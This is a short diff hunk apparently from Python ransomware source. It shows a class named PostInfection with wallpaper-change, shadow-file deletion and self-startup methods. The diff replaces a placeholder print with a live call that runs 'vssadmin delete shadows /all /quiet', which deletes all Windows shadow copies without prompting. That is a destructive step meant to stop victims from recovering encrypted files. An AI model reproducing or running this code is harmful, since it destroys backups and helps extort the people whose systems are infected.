@@ -19,7 +19,7 @@ class PostInfection(object):
             print("The problem has occured on changing wallpaper")
 
     def deleteShadowFiles(self):
-        print("deleteShadowFiles")
+        os.system('vssadmin.exe delete shadows /all /quiet')
     
     def setItselfStartUpApplication(self, keyspath):
         """
